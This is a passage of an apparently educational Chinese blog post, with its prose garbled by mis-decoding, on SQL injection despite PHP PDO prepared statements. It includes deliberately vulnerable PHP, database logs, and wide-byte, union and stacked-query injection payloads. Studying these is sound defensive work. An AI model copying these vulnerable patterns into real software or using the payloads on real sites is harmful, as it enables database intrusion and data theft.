title="PDO"></a>PDO</h5><ul><li>PHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚</li><li>PDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚</li><li>PDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚</li></ul><p>ä½¿ç”¨PDOå®ç°é¢„ç¼–è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index2.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;]; // æ¥æ”¶username<br><br># å»ºç«‹æ•°æ®åº“è¿æ¥<br>header(&quot;Content-Type:text/html;charset=utf-8&quot;);<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥<br>try&#123;<br>    $conn = new PDO($dbs, $dbname, $passwd);<br>    echo &quot;è¿æ¥æˆåŠŸ&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># è®¾ç½®é¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨å‘½åå ä½ç¬¦<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = :username&quot;);<br>$stmt-&gt;bindParam(&quot;:username&quot;,$username);<br>$stmt-&gt;execute();<br><br>if($fraction = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;åˆ†æ•°:&#x27;.$fraction;<br>print_r(&quot;åˆ†æ•°&quot;.$fraction[fraction]);<br>&#125;<br>else&#123;<br><br>&#125;<br>$conn=null; # å…³é—­é“¾æ¥<br>?&gt;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">27 Connectroot@localhost on sort using TCP/IP# ç®€å†è¿æ¥<br>27 Queryselect fraction from fraction where name = &#x27;mechoy&#x27;# æ‰§è¡ŒæŸ¥è¯¢<br>27 Quit# ç»“æŸ<br></code></pre></td></tr></table></figure><p>ä»æ—¥å¿—æ¥çœ‹ï¼Œæ²¡æœ‰prepareå’Œexecuteï¼Œåªæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªæŸ¥è¯¢çš„SQLè¯­å¥ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œé¢„ç¼–è¯‘ã€‚æ˜¾ç„¶ï¼ŒPDOé»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯æ¨¡æ‹Ÿé¢„ç¼–è¯‘ã€‚</p><blockquote><p>æ¨¡æ‹Ÿé¢„ç¼–è¯‘æ˜¯é˜²æ­¢æŸäº›æ•°æ®åº“ä¸æ”¯æŒé¢„ç¼–è¯‘è€Œè®¾ç½®çš„(å¦‚sqlliteä¸ä½ç‰ˆæœ¬MySQL)ã€‚å¦‚æœæ¨¡æ‹Ÿé¢„å¤„ç†å¼€å¯ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ç¨‹åºå†…éƒ¨ä¼šæ¨¡æ‹ŸMySQLæ•°æ®åº“ä¸­çš„å‚æ•°ç»‘å®šè¿™ä¸€è¿‡ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºä¼šåœ¨å†…éƒ¨æ¨¡æ‹Ÿprepareçš„è¿‡ç¨‹ï¼Œå½“æ‰§è¡Œexecuteæ—¶ï¼Œå†å°†æ‹¼æ¥åçš„å®Œæ•´SQLè¯­å¥å‘é€ç»™MySQLæ•°æ®åº“æ‰§è¡Œã€‚</p></blockquote><p>è€Œæƒ³è¦çœŸæ­£ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œé¦–å…ˆéœ€è¦æ•°æ®åº“æ”¯æŒé¢„ç¼–è¯‘ï¼Œå†åœ¨ä»£ç ä¸­åŠ å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment"># bool PDO::setAttribute ( int $attribute , mixed  $value )è®¾ç½®æ•°æ®åº“å¥æŸ„å±æ€§ã€‚</span><br><span class="hljs-comment"># PDO::ATTR_EMULATE_PREPARES å¯ç”¨æˆ–ç¦ç”¨é¢„å¤„ç†è¯­å¥çš„æ¨¡æ‹Ÿã€‚ æœ‰äº›é©±åŠ¨ä¸æ”¯æŒæˆ–æœ‰é™åº¦åœ°æ”¯æŒæœ¬åœ°é¢„å¤„ç†ã€‚ä½¿ç”¨æ­¤è®¾ç½®å¼ºåˆ¶PDOæ€»æ˜¯æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ï¼ˆå¦‚æœä¸º TRUE  ï¼‰ï¼Œæˆ–è¯•ç€ä½¿ç”¨æœ¬åœ°é¢„å¤„ç†è¯­å¥ï¼ˆå¦‚æœä¸º FALSE ï¼‰ã€‚å¦‚æœé©±åŠ¨ä¸èƒ½æˆåŠŸé¢„å¤„ç†å½“å‰æŸ¥è¯¢ï¼Œå®ƒå°†æ€»æ˜¯å›åˆ°æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ä¸Šã€‚éœ€è¦ bool  ç±»å‹ã€‚ </span><br><span class="hljs-comment">#è¿™é‡Œåœ¨PHP5.2.17æ—¶æ— æ•ˆï¼Œæš‚æœªæ‰¾åˆ°åŸå› </span><br><span class="hljs-comment">#æ›´æ”¹ç‰ˆæœ¬ä¸ºPHP5.6.9æ—¶ç”Ÿæ•ˆ</span><br></code></pre></td></tr></table></figure><p>å†æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br>4 Close stmt<br>4 Quit<br># å¯ä»¥çœ‹åˆ°å½“PDO::ATTR_EMULATE_PREPARESè®¾ç½®ä¸ºfalseæ—¶ï¼Œå–æ¶ˆäº†æ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œé‡‡ç”¨æœ¬åœ°é¢„å¤„ç†<br></code></pre></td></tr></table></figure><h3 id="é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥"><a href="#é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥" class="headerlink" title="é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥"></a>é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥</h3><h4 id="PDOæ¨¡æ‹Ÿé¢„å¤„ç†-å®½å­—èŠ‚"><a href="#PDOæ¨¡æ‹Ÿé¢„å¤„ç†-å®½å­—èŠ‚" class="headerlink" title="PDOæ¨¡æ‹Ÿé¢„å¤„ç†+å®½å­—èŠ‚"></a>PDOæ¨¡æ‹Ÿé¢„å¤„ç†+å®½å­—èŠ‚</h4><p>æ¨¡æ‹Ÿä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP5.2.17+MySQL5.7.26+Apache2.4.39ç¯å¢ƒä¸‹</span><br><span class="hljs-comment">// PHP5.6.9æ—¶æ— æ³•å®ç°</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1;charset=gbk&quot;</span>;<span class="hljs-comment">// è®¾ç½®æ•°æ®åº“å­—ç¬¦ç¼–ç </span><br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># è®¾ç½®æ¨¡æ‹Ÿé¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨å‘½åå ä½ç¬¦</span><br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-string">&#x27;SET NAMES GBK&#x27;</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = :username&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ä¼ å…¥<code>username=&quot;1&#39; union select database();#&quot;</code>æ—¶ï¼Œçœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">28 Connectroot@localhost on sort using TCP/IP<br>28 Queryselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database()#&#x27;<br>28 Quit<br># å°†å•å¼•å·è¿›è¡Œè½¬ä¹‰<br></code></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿé¢„å¤„ç†é˜²æ­¢sqlæ³¨å…¥çš„æœ¬è´¨æ˜¯åœ¨å‚æ•°ç»‘å®šè¿‡ç¨‹ä¸­å¯¹å‚æ•°å€¼è¿›è¡Œè½¬ä¹‰ä¸è¿‡æ»¤,è¿™ä¸€ç‚¹ä¸çœŸæ­£çš„sqlæ•°æ®åº“é¢„å¤„ç†æ˜¯ä¸ä¸€æ ·çš„ã€‚ç†è®ºä¸Šï¼Œsqlæ•°æ®åº“é¢„ç¼–è¯‘æ›´åŠ å®‰å…¨ä¸€äº›ã€‚</p></blockquote><p>å½“ä¼ å…¥<code>1%df%27%20union%20select%20database();#</code>æ—¶ï¼Œå†æŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">15 Connectroot@localhost on sort1 using TCP/IP<br>15 QuerySET NAMES GBK<br>15 Queryselect fraction from fraction where name = &#x27;1é‹&#x27; union select database();<br>//å¯ä»¥çœ‹åˆ°æˆåŠŸåˆ©ç”¨%dfåƒæ‰æ–œæ ï¼Œé€ æˆå®½å­—èŠ‚æ³¨å…¥<br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/9.png"></p><h4 id="PDOçš„é”™è¯¯ä½¿ç”¨"><a href="#PDOçš„é”™è¯¯ä½¿ç”¨" class="headerlink" title="PDOçš„é”™è¯¯ä½¿ç”¨"></a>PDOçš„é”™è¯¯ä½¿ç”¨</h4><p>ä¸€äº›ç¨å¾®æ¬ ç¼ºç»éªŒçš„å¼€å‘äººå‘˜ï¼Œå¯èƒ½ä¼šé”™è¯¯çš„ä½¿ç”¨PDOï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index4.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ç§çœ‹ä¼¼ç”¨äº†prepareè¿›è¡Œé¢„å¤„ç†ï¼Œä½†æ²¡æœ‰å…³é”®æ€§çš„å ä½ç¬¦ã€å‚æ•°ç»‘å®šï¼Œæ‰€ä»¥ç­‰åŒäºç›´æ¥æ‹¼æ¥</p><h4 id="PDOä¸­çš„å¤šæ¡æ‰§è¡Œ"><a href="#PDOä¸­çš„å¤šæ¡æ‰§è¡Œ" class="headerlink" title="PDOä¸­çš„å¤šæ¡æ‰§è¡Œ"></a>PDOä¸­çš„å¤šæ¡æ‰§è¡Œ</h4><p>PDOæœ‰ä¸€ä¸ªæœ‰è¶£çš„ç‰¹æ€§ï¼šé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œã€‚è¿™å°±é€ æˆäº†å †å æ³¨å…¥çš„å¯èƒ½ï¼Œå¦‚ä¸‹ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&lt;?php<br>$id= $_GET[&#x27;id&#x27;]; // æ¥æ”¶username<br><br># å»ºç«‹æ•°æ®åº“è¿æ¥<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥<br>try&#123;<br>$conn = new PDO($dbs, $dbname, $passwd);<br>echo &quot;Sucussful&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where id=$id&quot;);<br>$stmt-&gt;execute();<br>$fraction = $stmt-&gt;fetch();<br>print_r($fraction[fraction]);<br><br>$conn=null; # å…³é—­é“¾æ¥<br>?&gt;<br></code></pre></td></tr></table></figure><p>å½“è¾“å…¥<code>id=1;select%20database()</code>æ—¶ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">5 Connectroot@localhost on sort using TCP/IP<br>5 Queryselect fraction from fraction where id=1;<br>5 Queryselect database()<br># æ•°æ®åº“æ‰§è¡Œäº†ä¸¤æ¡æŸ¥è¯¢è¯­å¥<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ ·æœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œå›æ˜¾ä½ç½®åªæœ‰1ä¸ªï¼Œæ— æ³•å›æ˜¾å‡ºç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥çš„ç»“æœï¼Œä½†å¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢åšå‡ºæ¥</p><p>å…ˆæ‰§è¡Œï¼š<code>?id=1;insert into fraction(id,name,fraction) values(111,database(),user()) </code></p><p>æŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ä»¥åŠæ•°æ®åº“æ˜¯å¦æ’å…¥å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">10 Connectroot@localhost on sort using TCP/IP<br>10 Queryselect fraction from fraction where id=1;<br>10 Queryinsert into fraction(id,name,fraction) values(111,database(),user())<br># å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†ä¸¤æ¡è¯­å¥<br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/10.png"></p><p>å†æ‰§è¡Œï¼š<code>id=111</code>ï¼Œèƒ½å¤Ÿçœ‹åˆ°æˆåŠŸæŸ¥è¯¢ï¼Œä½†æœ‰ä¸ªé—®é¢˜æ˜¯å½“å›æ˜¾ä½ç½®çš„å€¼æ˜¯æœ‰ä¸ªæ•°å­—å‹æ—¶ï¼Œå°±æ— æ³•ç›´æ¥å°†æˆ‘ä»¬æƒ³è¦è·å–çš„å†…å®¹å­˜å…¥åˆ°æ•°æ®åº“çš„ç›¸åº”å­—æ®µä¸­äº†ï¼Œä½†å¥½åƒä¹Ÿæœ‰åŠæ³•ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/11.png"></p><h4 id="é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ"><a href="#é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ"></a>é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ</h4><p>ä¸æ˜¯æ‰€æœ‰çš„åœ°æ–¹éƒ½èƒ½ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œæœ‰äº›ä½ç½®å¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨é¢„ç¼–è¯‘ä¹‹åï¼Œsqlè¯­å¥ä¸ç”Ÿæ•ˆï¼Œè€Œè¿™äº›ä½ç½®åˆä¸å¾—ä¸ä½¿ç”¨æ‹¼æ¥ã€‚</p><h5 id="likeä½ç½®"><a href="#likeä½ç½®" class="headerlink" title="likeä½ç½®"></a>likeä½ç½®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">index6.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction where name like &#x27;%:username%&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥ï¼š<code>username=t</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">21 Connectroot@localhost on sort using TCP/IP<br>21 Prepareselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Executeselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Close stmt<br>21 Quit<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™é‡Œæ²¡æœ‰æŠŠæˆ‘ä»¬ä¼ çš„<code>username=t</code>ç»‘å®šåˆ°æŸ¥è¯¢è¯­å¥ä¸­å»ï¼Œè¿™æ˜¯å› 